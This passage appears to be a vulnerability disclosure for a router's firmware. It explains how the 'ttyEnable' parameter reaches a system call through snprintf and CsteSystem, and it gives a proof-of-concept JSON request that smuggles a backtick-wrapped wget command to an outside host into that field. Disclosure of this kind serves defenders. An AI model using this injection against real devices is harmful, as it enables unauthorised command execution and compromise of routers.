...
In sub_422400 function, it reads in a user-provided parameter `ttyEnable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.

<div  align="center"><img src="./img/lib.png" style="zoom:80%;" /></div>

However ,the value of the `ttyEnable`  is inserted into `v11`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.
...
We set `ttyEnable` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setTtyServiceCfg","ttyEnable":"`wget 192.168.6.1:7777/testpoc`"
}
```
